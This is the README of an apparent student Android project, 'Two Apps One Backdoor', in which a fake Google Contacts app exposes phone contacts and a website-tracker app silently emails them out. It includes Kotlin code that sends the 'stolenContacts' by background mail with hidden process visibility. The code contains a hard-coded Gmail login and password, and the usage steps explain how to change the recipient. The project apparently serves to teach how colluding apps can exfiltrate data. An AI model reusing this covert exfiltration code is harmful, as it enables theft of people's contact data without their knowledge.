# Two Apps One Backdoor

## Description

This is a third-year student project for the mobile development subject at the Enseirb-Matmeca of Bordeaux (France).

This project is made up of two applications:

- **Contacts**: Displays the phone contacts (a seemingly Google Contacts application).
- **WebsiteTracker**: Provides a sort of "tracker" for websites with dates of visit and ratings of these visited websites.

In background, **Contacts** exfiltrates the data contact thanks to a ContentProvider, and **WebsiteTracker** sends an email with this data.

## Usage

In order to custom the mail address, go to the `MainActivity` of the **WebTracker** application. Then just replace the `withMailto()` parameter with your desired mail.

```kt
  newBuilder(this)
            .withUsername("it362.test2021@gmail.com")
            .withPassword("enseirbtest")
            .withMailto("it362.test2021@yopmail.com")
            .withType(TYPE_PLAIN)
            .withSubject("Android project")
            .withBody("stolenContacts= ${Gson().toJson(stolenContacts)}")
            .withOnSuccessCallback {
                Log.i("MainActivity", "Successful mail sending!")
            }
            .withOnFailCallback {
                Log.e("MainActivity", "Error occurred while sending mail...")
            }
            .withProcessVisibility(false)
            .send()
```

## Authors and acknowledgment

Deborah PEREIRA and Sophie STAN.

---

Special thanks to [yesidlazaro](https://github.com/yesidlazaro) whose library for [background mails](https://github.com/yesidlazaro/GmailBackground) helped us save much boilerplate code.
